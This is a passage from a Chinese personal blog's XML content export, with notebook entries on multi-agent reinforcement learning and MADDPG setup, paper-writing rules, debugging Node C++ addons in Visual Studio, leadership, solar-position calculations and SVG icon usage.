<li><a href="https://www.zhihu.com/question/22446174" target="_blank" rel="noopener">怎样做好学术 PPT？</a>,by zhihu.</li>
<li><a href="https://www.editing.tw/files/SpeechD.ppt" target="_blank" rel="noopener">“How to present a papers at an academic conferences”</a>,by editing.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>多智能体强化学习</title>
    <url>/2022/01/18/%E5%A4%9A%E6%99%BA%E8%83%BD%E4%BD%93%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>强化学习的核心思想是“试错”（trial-and-error）：智能体通过与环境的交互，根据获得的反馈信息迭代地优化。在 RL 领域，待解决的问题通常被描述为马尔科夫决策过程。</p>
<p>当同时存在多个智能体与环境交互时，整个系统就变成一个多智能体系统（multi-agent system）。每个智能体仍然是遵循着强化学习的目标，也就是是最大化能够获得的累积回报，而此时环境全局状态的改变就和所有智能体的联合动作（joint action）相关了。因此在智能体策略学习的过程中，需要考虑联合动作的影响。</p>
<p>马尔科夫决策过程拓展到多智能体系统，被定义为马尔科夫博弈（又称为随机博弈，Markov/stochastic game）。</p>
<h1 id="完全合作式"><a href="#完全合作式" class="headerlink" title="完全合作式"></a>完全合作式</h1><h1 id="完全竞争式"><a href="#完全竞争式" class="headerlink" title="完全竞争式"></a>完全竞争式</h1><h1 id="混合关系式"><a href="#混合关系式" class="headerlink" title="混合关系式"></a>混合关系式</h1><h1 id="MADDPG算法"><a href="#MADDPG算法" class="headerlink" title="MADDPG算法"></a>MADDPG算法</h1><p><a href="https://github.com/openai/maddpg" target="_blank" rel="noopener">MADDPG</a>是OpenAI给的仿真代码。</p>
<h2 id="安装MADDPG"><a href="#安装MADDPG" class="headerlink" title="安装MADDPG"></a>安装MADDPG</h2><p>安装步骤如下：</p>
<ol>
<li>安装pyenv，用于python的多版本管理</li>
<li>使用pyenv安装python 3.5.4</li>
<li>使用venv创建虚拟环境</li>
<li>使用pip安装OpenAI gym (0.10.5), tensorflow (1.8.0), numpy (1.14.5)</li>
</ol>
<p>注意使用pip安装tensorflow (1.8.0)时，可能报错，需要先安装grpcio(1.10.1)。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/272735656" target="_blank" rel="noopener">万字长文：详解多智能体强化学习的基础和应用</a>,by 机器之心.</li>
<li><a href="https://zhuanlan.zhihu.com/p/71112669" target="_blank" rel="noopener">多智能体强化学习综述-Lucian Busoniu</a>,by Xray.</li>
<li><a href="https://www.jiqizhixin.com/articles/2020-11-03-10" target="_blank" rel="noopener">AlphaGo原来是这样运行的，一文详解多智能体强化学习的基础和应用</a>,by 机器之心.</li>
<li><a href="https://zhuanlan.zhihu.com/p/72553328" target="_blank" rel="noopener">多智能体强化学习中的非平稳性问题</a>,by hoogle.</li>
<li><a href="https://zhuanlan.zhihu.com/p/34089913" target="_blank" rel="noopener">深度强化学习的弱点和局限</a>,by 论智.</li>
<li><a href="https://www.sohu.com/a/476438990_120112057" target="_blank" rel="noopener">Self-Play：让计算机学会相扑的强化学习“左右互搏术” </a>,by 贪心科技.</li>
<li><a href="https://gyh75520.github.io/2017/07/27/%E4%BB%8EFictitious%20Play%20%E5%88%B0%20NFSP/" target="_blank" rel="noopener">从Fictitious Play 到 NFSP</a>,by Yumho.</li>
<li><a href="https://www.codenong.com/cs109734014/" target="_blank" rel="noopener">传统的战略式博弈求解方法——虚拟博弈(Fictitious Play)讲解及其代码</a>,by 码农家园.</li>
<li><a href="https://blog.csdn.net/weixin_37837522/article/details/91907661" target="_blank" rel="noopener">【论文阅读】Deep Reinforcement Learning from Self-Play in Imperfect-Information Games</a>,by 博弈真的不简单啊.</li>
<li><a href="https://www.cnblogs.com/suancai/p/15339812.html" target="_blank" rel="noopener">多智能体博弈强化学习研究综述笔记</a>,by 一丨.</li>
<li><a href="https://www.cnblogs.com/suancai/p/15332556.html" target="_blank" rel="noopener">多智能体博弈强化学习研究综述笔记</a>,by 一丨.</li>
<li><a href="https://zhuanlan.zhihu.com/p/149272695" target="_blank" rel="noopener">【多智能体RL】Actor-Attention-Critic for Multi-Agent RL</a>,by 星桥翊月.</li>
<li><a href="https://zhuanlan.zhihu.com/p/51858687" target="_blank" rel="noopener">COMA：Counterfactual Multi-Agent Policy Gradients</a>,by 张现杰.</li>
<li><a href="https://www.cnblogs.com/wangxiaocvpr/p/7730697.html" target="_blank" rel="noopener">Multi-Agent Actor-Critic for Mixed Cooperative-Competitive Environments</a>,by AHU-WangXiao.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32333293" target="_blank" rel="noopener">丧的时候写写东西总没错，《Multi-Agent Actor-Critic for Mixed Cooperative-Competitive Environments》</a>,by 王小惟 Weixun.</li>
<li><a href="https://zhuanlan.zhihu.com/p/53811876" target="_blank" rel="noopener">多智能体强化学习入门（四）——MADDPG算法</a>,by ECKai.</li>
<li><a href="https://blog.csdn.net/zbp_12138/article/details/107440531" target="_blank" rel="noopener">从代码到论文理解并复现MADDPG算法(基于飞桨的强化学习套件PARL)</a>,by Mr.郑先生_.</li>
<li><a href="https://jianengli.github.io/2021/03/19/rl/maddpg/" target="_blank" rel="noopener">maddpg原理以及代码解读</a>,by Jianeng.</li>
<li><a href="https://www.codenong.com/cs122061374/" target="_blank" rel="noopener">linux中配置MPE和MADDPG环境</a>,by codenong.</li>
<li><a href="https://blog.csdn.net/weixin_43483381/article/details/114240352" target="_blank" rel="noopener">Multi-agent Particle Environment - MPE多智能体强化学习运行环境的任务简介</a>,by 普通攻击往后拉.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32528578" target="_blank" rel="noopener">左右互搏，self-play，《Emergent Complexity via Multi-Agent Competition》</a>,by 王小惟 Weixun.</li>
<li><a href="https://zhuanlan.zhihu.com/p/87980338" target="_blank" rel="noopener">多智能体深度强化学习综述与批判</a>,by Xray.</li>
<li><a href="https://www.infoq.cn/article/dleqwrpc-pcek5eq6but" target="_blank" rel="noopener">伯克利开源工具库 RLib 现已支持大规模多智能体强化学习</a>,by Eric Liang.</li>
<li><a href="https://blog.csdn.net/lionel_fengj/article/details/82777953" target="_blank" rel="noopener">python2 安装 tensorflow 遇到问题</a>,by leo_fengj.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>如何写好一篇论文的十条基本原则</title>
    <url>/2019/01/17/%E5%A6%82%E4%BD%95%E5%86%99%E5%A5%BD%E4%B8%80%E7%AF%87%E8%AE%BA%E6%96%87%E7%9A%84%E5%8D%81%E6%9D%A1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<p>看到一篇有关如何撰写科技论文的好文章，赶紧摘抄一下。</p>
<h1 id="原则（规则-1–4）"><a href="#原则（规则-1–4）" class="headerlink" title="原则（规则 1–4）"></a>原则（规则 1–4）</h1><p>写作即交流。因此，读者体验是首等重要的，所有的写作服务于这一目标。当你写作时，心中要时时有读者。以下四条规则是关于如何赢取读者。</p>
<h2 id="规则-1：论文有一个中心主旨，并体现在标题中"><a href="#规则-1：论文有一个中心主旨，并体现在标题中" class="headerlink" title="规则 1：论文有一个中心主旨，并体现在标题中"></a>规则 1：论文有一个中心主旨，并体现在标题中</h2><h2 id="规则-2：假设写作对象对论文内容一无所知"><a href="#规则-2：假设写作对象对论文内容一无所知" class="headerlink" title="规则 2：假设写作对象对论文内容一无所知"></a>规则 2：假设写作对象对论文内容一无所知</h2><h2 id="规则-3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构"><a href="#规则-3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构" class="headerlink" title="规则 3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构"></a>规则 3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构</h2><h2 id="规则-4：避免委婉，使用并行优化的逻辑流"><a href="#规则-4：避免委婉，使用并行优化的逻辑流" class="headerlink" title="规则 4：避免委婉，使用并行优化的逻辑流"></a>规则 4：避免委婉，使用并行优化的逻辑流</h2><h1 id="论文组成（规则-5-8）"><a href="#论文组成（规则-5-8）" class="headerlink" title="论文组成（规则 5-8）"></a>论文组成（规则 5-8）</h1><p>论文的摘要、介绍、结果与讨论都适用于 C-C-C 结构，但各有些许不同。在下图中，我们将讨论这些专门结构的问题：</p>
<p align="center">
    <img src="images/paper_structure.jpg" width="90%" alt="论文结构"/>
</p>

<h2 id="规则-5：在摘要中总结所有要点"><a href="#规则-5：在摘要中总结所有要点" class="headerlink" title="规则 5：在摘要中总结所有要点"></a>规则 5：在摘要中总结所有要点</h2><h2 id="规则-6：在介绍中讨论这篇论文的重要性"><a href="#规则-6：在介绍中讨论这篇论文的重要性" class="headerlink" title="规则 6：在介绍中讨论这篇论文的重要性"></a>规则 6：在介绍中讨论这篇论文的重要性</h2><h2 id="规则-7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果"><a href="#规则-7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果" class="headerlink" title="规则 7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果"></a>规则 7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果</h2><h2 id="规则-8：讨论如何填补差距、论文的局限性和论文与该领域的相关性"><a href="#规则-8：讨论如何填补差距、论文的局限性和论文与该领域的相关性" class="headerlink" title="规则 8：讨论如何填补差距、论文的局限性和论文与该领域的相关性"></a>规则 8：讨论如何填补差距、论文的局限性和论文与该领域的相关性</h2><h1 id="写作流程（规则-9-和-10）"><a href="#写作流程（规则-9-和-10）" class="headerlink" title="写作流程（规则 9 和 10）"></a>写作流程（规则 9 和 10）</h1><h2 id="规则-9：把时间花费到关键的地方：题目、摘要、图和大纲"><a href="#规则-9：把时间花费到关键的地方：题目、摘要、图和大纲" class="headerlink" title="规则 9：把时间花费到关键的地方：题目、摘要、图和大纲"></a>规则 9：把时间花费到关键的地方：题目、摘要、图和大纲</h2><h2 id="规则-10：获取反馈，然后简化、重新使用、再次构造这个故事"><a href="#规则-10：获取反馈，然后简化、重新使用、再次构造这个故事" class="headerlink" title="规则 10：获取反馈，然后简化、重新使用、再次构造这个故事"></a>规则 10：获取反馈，然后简化、重新使用、再次构造这个故事</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/30575091" target="_blank" rel="noopener">从标题到写作流程：写好一篇论文的十条基本原则</a>,by 机器之心.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在Vistual_Studio中调试Node_Addon_C++插件</title>
    <url>/2018/06/18/%E5%A6%82%E4%BD%95%E5%9C%A8Vistual-Studio%E4%B8%AD%E8%B0%83%E8%AF%95Node-Addon-C-%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>最近研究如何在Vistual Studio 2017社区版中调试Node addon C++插件，遇到很多问题，花费了不少时间，为防止遗忘，将方法记录下来。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol>
<li>安装VS2017社区版</li>
<li>安装python 2.7</li>
<li>安装Nodejs 8.11.3 LTS</li>
<li>下载Nodejs 8.11.3 LTS源码</li>
</ol>
<h1 id="安装配置环境"><a href="#安装配置环境" class="headerlink" title="安装配置环境"></a>安装配置环境</h1><ol>
<li><p>安装node-gyp和nan<br>node-gyp和nan用于编译生成node addon 插件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g node-gyp</span><br><span class="line">npm install -g nan</span><br></pre></td></tr></table></figure></li>
<li><p>编译nodejs源码<br>在nodejs源码解压后文件夹中执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\vcbuild.bat debug x64</span><br></pre></td></tr></table></figure></li>
<li><p>创建nodejs addon c++插件示例工程<br>使用如下命名生成调试用的vs工程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node-gyp configure rebuild --nodedir&#x3D;&quot;D:\project\cpp_project\node-v8.11.3&quot; --debug</span><br></pre></td></tr></table></figure></li>
<li><p>修改测试用的index.js,使其调用上一步骤生成的调试用的插件  </p>
<pre><code>//该js调用生成的插件
var addon = require(&apos;./build/Debug/max&apos;);
var y=addon.max(2,3);
console.log(y);</code></pre></li>
<li><p>使用VS2017打开插件示例工程的build文件夹下node-gyp生成的解决方案。右键单击工程，在上下文菜单中点击属性，配置其调试命令和命令参数，如下图所示。</p>
<p align="center">
 <img src="images/debug_config.jpg" width="50%" alt="工程调试配置"/>
</p>
</li>
<li><p>设置断点进行调试</p>
</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/zcyzsy/article/details/72821755" target="_blank" rel="noopener">如何在VS2015中搭建可以写node.js的C++Addon的环境</a>, by Zmyths.</li>
<li><a href="https://computer-vision-talks.com/how-to-debug-nodejs-addons-in-visual-studio/" target="_blank" rel="noopener">how-to-debug-nodejs-addons-in-visual-studio</a>,by cvtalks. </li>
<li><a href="https://blog.csdn.net/jxyb2012/article/details/83009765" target="_blank" rel="noopener">Vistual Studio Community 2017 30天许可证过期</a>,by 井底一蛤蟆.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>如何处理前端异常</title>
    <url>/2020/07/02/%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E5%89%8D%E7%AB%AF%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.fundebug.com/2018/12/07/how-to-handle-frontend-error/" target="_blank" rel="noopener">如何优雅处理前端异常？</a>,by Jartto.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>如何培养领导力</title>
    <url>/2020/06/19/%E5%A6%82%E4%BD%95%E5%9F%B9%E5%85%BB%E9%A2%86%E5%AF%BC%E5%8A%9B/</url>
    <content><![CDATA[<p>俗话说，一个人走得快，一群人走得远。作为一个团队的领导，拥有高超的领导力，是团队走向成功的关键。那么如何培养提高自己的领导力呢？美国一个创业者给出了一个方法。按照下面的四个阶段，就能让自己成为一个优秀的领导者。</p>
<p><strong>第一阶段：熟悉自己的业务，知道问题在哪里，怎样可以解决。</strong></p>
<p>领导者是给大家指方向的，你必须先知道要走哪个方向，才能带领别人，这是领导力的基础。</p>
<p><strong>第二阶段：培养说服能力，能说服他人，问题可以按照你说的方式解决。</strong></p>
<p>领导力的表现是，他人愿意服从你。这不能都靠制度压服，而要让他人真心觉得你是对的。如果你可以让他人相信你，你就可以领导。</p>
<p><strong>第三阶段：激发他人的热情，让他们产生解决问题的热情。</strong></p>
<p>说服他人的更高境界，是让他们真正投身进来，自觉发挥自己的潜力，全力以赴解决需要解决的问题。好的领导和差的领导，区别就在于能否激励下级，让每个人都知道自己的职责，努力工作。</p>
<p><strong>第四阶段：你培养其他人的领导能力。</strong></p>
<p>如果你离开，团队也能正常运作下去，说明一切已经制度化了，你的领导已经成功了。这时，你可以让其他人接管团队，自己去实现下一个目标。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://medium.com/@benmappen/the-culture-of-leadership-eb424b0726ef" target="_blank" rel="noopener">The Culture of Leadership</a>,by Ben Mappen.</li>
<li><a href="http://www.ruanyifeng.com/blog/2020/06/weekly-issue-112.html" target="_blank" rel="noopener">科技爱好者周刊（第 112 期）：如何培养领导力</a>,by ruanyifeng.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>管理</tag>
      </tags>
  </entry>
  <entry>
    <title>太阳位置及辐射强度等属性的计算方法</title>
    <url>/2019/11/26/%E5%A4%AA%E9%98%B3%E4%BD%8D%E7%BD%AE%E5%8F%8A%E8%BE%90%E5%B0%84%E5%BC%BA%E5%BA%A6%E7%AD%89%E5%B1%9E%E6%80%A7%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>太阳位置是从地球表面观察时，太阳在天空中的位置，它是时间和地理位置两者的函数。计算给定地点和时间的太阳位置要经过下列三个步骤：</p>
<ul>
<li>计算太阳在黄道坐标系的位置</li>
<li>转换到赤道坐标系统</li>
<li>依据观测者的位置和时间，转换到地平坐标系</li>
</ul>
<h1 id="计算太阳黄道坐标的方法"><a href="#计算太阳黄道坐标的方法" class="headerlink" title="计算太阳黄道坐标的方法"></a>计算太阳黄道坐标的方法</h1><p>黄道坐标系是以黄道作基准平面的天球坐标系统，多用作研究太阳系天体运动情况之用。如图1所示。</p>
<p align="center">
    <img src="images/Earths_orbit_and_ecliptic.png" width="80%" alt="黄道坐标系"/>
</p>
<center>图1 黄道坐标系</center>

<p>黄道是由地球上观察太阳一年中在天球上的视运动所通过的路径，若以地球“不动”作参照的话就是太阳绕地球公转的轨道平面（黄道面）在天球上的投影。</p>
<p>黄道与天赤道相交于两点：春分点与秋分点（这两点称二分点）；而黄道对应的两个几何极是北黄极（在天龙座）、与南黄极 (在剑鱼座)。</p>
<p>在黄道上与黄道平行的小圆称黄纬，符号β，以由黄道面向北黄极方向为正值（0°至90°），向南黄极方向则为负值。垂直黄道的经度称黄经，符号为λ，由春分点起由西向东量度（0°至360°）。像赤道坐标系中的赤经一样，以春分点做为黄经的起点。</p>
<p>此坐标系特别适合标示太阳系内天体的位置，大多数行星（水星和冥王星除外）与许多小行星轨道平面与黄道的倾角都很小，故其黄纬值（β）都不大。</p>
<p>太阳黄道坐标的近似计算方法如下：</p>
<p>先计算与格林尼治 2000.0年1月1日中午12:00（历元）相距的日数。如果你知道儒略日，则你的叙述会如下：</p>
<p>$$ n = \mathrm{JD} - 2451545.0 $$</p>
<p>以光行差修正太阳的平黄经，如下：</p>
<p>$$ L = 280.460^\circ + 0.9856474^\circ n $$</p>
<p>太阳的平近点角（实际上，是地球在轨道上绕着太阳，但是假设太阳绕着地球比较方便）如下：</p>
<p>$$ g = 357.528^\circ + 0.9856003^\circ n $$</p>
<p>根据需要将L和g多次加或减360°，让数值的范围调整到0°至 360°之间。</p>
<p>最后，太阳的黄经是：</p>
<p>$$ \lambda = L + 1.915^\circ \sin g + 0.020^\circ \sin 2g$$</p>
<p>太阳的黄纬是:</p>
<p>$$ \beta = 0 $$</p>
<p>太阳的黄纬不超过0.00033，</p>
<p>并且从太阳到地球的距离，以天文单位度量是：</p>
<p>$$ R = 1.00014 - 0.01671 \cos g - 0.00014 \cos 2g $$</p>
<h1 id="计算太阳赤道坐标的方法"><a href="#计算太阳赤道坐标的方法" class="headerlink" title="计算太阳赤道坐标的方法"></a>计算太阳赤道坐标的方法</h1><p>赤道坐标系统是使用得最广泛的天球坐标系统，他的元素是:</p>
<ul>
<li>赤纬（$\delta$）</li>
<li>赤经（$\alpha$ ）－也记为RA</li>
</ul>
<p>他与地理坐标系统非常相似，因为两者使用相同的基准平面和相同的极点。地球的赤道在天球上的投影就称为天球赤道，相同的，地理极点在天球上的投影就是天极，如图2所示。</p>
<p align="center">
    <img src="images/AxialTiltObliquity.png" width="80%" alt="赤道坐标系"/>
</p>
<center>图2 赤道坐标系</center>

<p>在经过一夜或数个夜晚，就能看出来星星在天空中的位置移动了，当然，这并非恒星在天球上的运动，只是地球运动造成的。因为岁差和章动的影响，在相当长的时间间隔下所做的观测，就必须注明所使用的特殊历元，为行星、恒星、星系等等的位置做记录。现在使用的历元是J2000.0分点，稍早期使用的是B1950.0分点。</p>
<p>赤道坐标系统中与纬度相似的值是赤纬(缩写为Dec.)，是天体在天球赤道上方或下方的角度。与经度对应的是赤经(缩写为RA)，是与春分点的角度距离，不同于经度的是赤经以时、分、秒为单位，而非度、分、秒。</p>
<p>$\lambda$、$\beta$ 和 $R$ 构成太阳在黄道座标完整的位置。通过黄赤交角 $ε$ 的计算可以转换成赤道座标，计算方法如下：</p>
<p>赤经：</p>
<p>$$ \alpha = \arctan(\cos \epsilon \tan \lambda)$$</p>
<p>赤纬：</p>
<p>$$ \delta = \arcsin(\sin \epsilon \sin \lambda)$$</p>
<p>其中，黄赤交角不是固定不变的，它目前的值接近：</p>
<p>$$  \epsilon = 23.439^\circ - 0.0000004^\circ n $$</p>
<h1 id="计算太阳地平坐标的方法"><a href="#计算太阳地平坐标的方法" class="headerlink" title="计算太阳地平坐标的方法"></a>计算太阳地平坐标的方法</h1><p>地平坐标系，又作地平座标系，是天球坐标系统中的一种，以观测者所在地为中心点，所在地的地平线作为基础平面，将天球适当的分成能看见的上半球和看不见（被地球本身遮蔽）的下半球。上半球的顶点（最高点）称为天顶，下半球的顶点（最低点）称为地底。如图3所示。</p>
<p align="center">
    <img src="images/Horizontal_coordinate_system.png" width="80%" alt="地平坐标系"/>
</p>
<center>图3 地平坐标系</center>

<p>地平坐标系统是：</p>
<ul>
<li>高度角（Altitude, Alt）或仰角又称地平纬度，是天体和观测者所在地的地平线的夹角，有时就称为高度或海拔标高（elevation, geometric height）。</li>
<li>方位角（Azimuth, Az）又称地平经度，是沿着地平线测量的角度（由正北方为起点向东方测量）。</li>
</ul>
<p>因此地平坐标系有时也被称为高度/方位（Alt/Az）坐标系统。</p>
<p>只要知道观测者的地理坐标与时间，就可以将地平坐标转换成赤道坐标，或是反过来将赤道坐标转换成地平坐标。（纬度在北极点是+90°，在赤道是0°，南极点是-90°。）</p>
<p>在数学公式中，以$A$代表方位，$a$代表高度。</p>
<p>以$\delta$ 表示赤纬，$H$ 表示时角。 $φ$ 为观测者所在地的纬度。</p>
<p>赤道坐标转为地平坐标的计算方法如下：</p>
<p>$$\sin a=\sin \phi \cdot \sin \delta +\cos \phi \cdot \cos \delta \cdot \cos H$$</p>
<p>$${\displaystyle \cos A\cdot \cos a=-\cos \phi \cdot \sin \delta +\sin \phi \cdot \cos \delta \cdot \cos H}$$</p>
<p>$${\displaystyle \sin A\cdot \cos a=\cos \delta \cdot \sin H}$$</p>
<p>有些人或许会试图将最后两个公式相除来加以简化，以消除$\cos a$，而只剩下$\tan A$。但是正切函数不能清楚的区别出象限，例如45°和225°是完全不同的方位，分别指向相对的东北方和西南方。</p>
<p>时角（HA）是天文学的名词，一个天体的时角被定义为该天体的赤经与当地的恒星时的差值。 在天文学和天文航海中，时角是在赤道坐标系中用于给出天球上点的方向的坐标之一。 一个点的时角是两个平面之间的角度：一个平面包含地轴和天顶（子午面），另一个平面是穿过该点与极点（地轴）的球面大圆切圆所形成的平面（赤经圈）。如图4所示。</p>
<p align="center">
    <img src="images/HourAngle_Observer_en.png" width="80%" alt="时角"/>
</p>
<center>图3 时角</center>


<p>时角由天赤道平面上的橙色箭头指示。 箭头自天球天赤道的子午面至观测目标所在面的球面大圆处结束，该球面大圆也是赤经圈<br>时角由子午线确定，遵循的规则是在子午线的东边则为负时角，在子午线的西边则为正时角，或者向西为正的360度，时角与经度的换算方法为24h = 360°。</p>
<p>一个天体的时角表示该天体是否通过了当地的子午圈（中天）。其数值则表示了该天体与当地子午圈的角距离，并借用时间的单位，以小时来计量（1HA = 15度）。例如，一个天体的时角是2.5HA，就表示他已经在2.5个小时之前通过当地的子午圈，并且在当地子午圈的西方37.5度的距离上。负数则表示在多少小时之后将通过当地的子午圈。当然，当时角为0时的意思就是这个天体就在当地的子午圈上。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%A4%AA%E9%99%BD%E4%BD%8D%E7%BD%AE" target="_blank" rel="noopener">太阳位置</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%84%92%E7%95%A5%E6%97%A5" target="_blank" rel="noopener">儒略日</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%BB%83%E9%81%93%E5%9D%90%E6%A8%99%E7%B3%BB" target="_blank" rel="noopener">黄道坐标系</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B5%A4%E9%81%93%E5%9D%90%E6%A8%99%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">赤道坐标系统</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%B9%B3%E5%9D%90%E6%A8%99%E7%B3%BB" target="_blank" rel="noopener">地平坐标系</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%99%82%E8%A7%92" target="_blank" rel="noopener">时角</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用图标icon</title>
    <url>/2019/08/25/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%9B%BE%E6%A0%87icon/</url>
    <content><![CDATA[<p>在前端网页的世界里，Icon是最基本的元素之一。使用Icon已成为前端开发者最基本的技能。下面将主要介绍利用SVG Sprites技术在前端中使用Icon的方法。</p>
<h1 id="Icon的演化史"><a href="#Icon的演化史" class="headerlink" title="Icon的演化史"></a>Icon的演化史</h1><p>Icon最早用img实现，后为了提高效率，减少img请求，出现image sprite技术，实现将多个图片合成一个图片，然后利用 css 的 background-position 定位显示不同的 icon 图标。但该技术维护困难。</p>
<p>随后出现了<strong>font库</strong>实现页面图标，例如<a href="https://fontawesome.com/" target="_blank" rel="noopener"> Font Awesome</a>。目前最常用的是<a href="https://www.iconfont.cn/" target="_blank" rel="noopener">iconfont</a>，里面图标应有尽有，且开源。</p>
<h1 id="iconfont的使用方法"><a href="#iconfont的使用方法" class="headerlink" title="iconfont的使用方法"></a>iconfont的使用方法</h1><h2 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h2><p>优势：</p>
<ul>
<li>兼容性最好，支持ie6+</li>
<li>支持按字体的方式去动态调整图标大小，颜色等等</li>
</ul>
<p>劣势:</p>
<ul>
<li>不支持多色图标</li>
<li>在不同的设备浏览器字体的渲染会略有差别</li>
</ul>
<p>具体使用方法参考<a href="https://juejin.im/post/59bb864b5188257e7a427c09" target="_blank" rel="noopener">手摸手，带你优雅的使用 icon</a>，不建议使用。</p>
<h2 id="font-class"><a href="#font-class" class="headerlink" title="font-class"></a>font-class</h2><p>与unicode使用方式相比，具有如下特点：</p>
<ul>
<li>兼容性良好，支持ie8+</li>
<li>相比于unicode语意明确，书写更直观。可以很容易分辨这个icon是什么。</li>
</ul>
<h2 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h2><p>随着IE浏览器逐渐淡出历史舞台，svg-icon 使用形式慢慢成为主流和推荐的方法，请参考<a href="https://www.zhangxinxu.com/wordpress/2014/07/introduce-svg-sprite-technology/?spm=a313x.7781069.1998910419.50" target="_blank" rel="noopener">未来必热：SVG Sprites技术介绍</a>。其优点有：</p>
<ul>
<li>支持多色图标了，不再受单色限制。</li>
<li>支持像字体那样通过font-size,color来调整样式。</li>
<li>支持 ie9+</li>
<li>可利用CSS实现动画。</li>
<li>减少HTTP请求。</li>
<li>矢量，缩放不失真</li>
<li>可以很精细的控制SVG图标的每一部分</li>
</ul>
<p>具体使用方法如下：</p>
<ul>
<li>使用SVG Sprite生成SVG雪碧图</li>
</ul>
<p align="center">
    <img src="images/svg_sprite.png" width="90%" alt="SVG雪碧图"/>
</p>
<center>图1  SVG雪碧图</center>

<ul>
<li>加入通用css代码（引入一次就行）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">    .icon &#123;</span><br><span class="line">       width: 1em; height: 1em;</span><br><span class="line">       vertical-align: -0.15em;</span><br><span class="line">       fill: currentColor;</span><br><span class="line">       overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>挑选相应图标并获取类名，应用于页面</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg class&#x3D;&quot;icon&quot; aria-hidden&#x3D;&quot;true&quot;&gt;</span><br><span class="line">    &lt;use xlink:href&#x3D;&quot;#icon-xxx&quot;&gt;&lt;&#x2F;use&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

<p>使用svg-icon的好处是再也不用发送woff|eot|ttf| 这些很多个字体库请求了，所有的svg都可以内联在html内。且svg 是一个真正的矢量，不管再怎么的放缩它都不会失真模糊，而且svg可以控制的属性也更加的丰富，也能做出更加生动和复杂的图标。</p>
<h1 id="生成SVG-sprite的方法"><a href="#生成SVG-sprite的方法" class="headerlink" title="生成SVG sprite的方法"></a>生成SVG sprite的方法</h1><p>推荐使用<a href="https://github.com/kisenka/svg-sprite-loader" target="_blank" rel="noopener">svg-sprite-loader </a>,它是一个Webpack loader。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#39;@&#x2F;src&#x2F;icons&#x2F;qq.svg; &#x2F;&#x2F;引入图标</span><br><span class="line">&lt;svg&gt;&lt;use xlink:href&#x3D;&quot;#qq&quot; &#x2F;&gt;&lt;&#x2F;svg&gt;  &#x2F;&#x2F;使用图标</span><br></pre></td></tr></table></figure>

